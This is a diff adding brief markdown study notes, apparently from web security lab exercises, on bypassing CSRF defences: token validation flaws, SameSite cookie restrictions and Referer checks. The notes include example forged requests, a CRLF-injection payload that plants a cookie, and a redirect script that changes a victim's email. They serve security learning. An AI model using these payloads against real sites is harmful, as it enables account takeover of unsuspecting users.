@@ -1,0 +1,94 @@
+
+
+# Bypassing CSRF token validation
+
+### Validation of CSRF token depends on request method
+
+-try diffrent methods
+
+### Validation of CSRF token depends on token being present
+
+-remove paramter
+
+### CSRF token is not tied to the user session
+
+-obtain a token and use it
+
+### CSRF token is tied to a non-session cookie
+
+EX:
+```http
+POST /email/change HTTP/1.1  
+Host: vulnerable-website.com  
+Content-Type: application/x-www-form-urlencoded  
+Content-Length: 68  
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  
+  
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+```
+
+
+use crlf injection EX :
+
+```http
+/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
+```
+
+
+### CSRF token is simply duplicated in a cookie
+
+-some applications do not maintain any server-side record of tokens that have been issued
+
+-the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie-but
+
+-instead duplicate each token within a cookie and a request parameter.
+
+EX:
+```http
+POST /email/change HTTP/1.1  
+Host: vulnerable-website.com  
+Content-Type: application/x-www-form-urlencoded  
+Content-Length: 68  
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa  
+  
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+
+
+
+# Bypassing SameSite cookie restrictions
+
+### Bypassing SameSite Lax restrictions using GET requests
+
+-craft get link
+
+-method override
+
+### Bypassing SameSite restrictions using on-site gadgets (Strict , Lax )
+
+-find a gadget that results in a secondary request within the same site
+
+EX : DOM-based open redirection.
+
+```html
+<script>  
+document.location =```https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?  
+postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1```;  
+</script>
+```
+
+
+### Bypassing SameSite restrictions via vulnerable sibling domains
+
+-xss
+
+-Cross-site WebSocket hijacking
+
+
+# Bypassing Referer-based CSRF defenses
+
+### Validation of Referer depends on header being present
+
+ HTML page that hosts the CSRF attack contain:  
+<meta name="referrer" content="never">
+
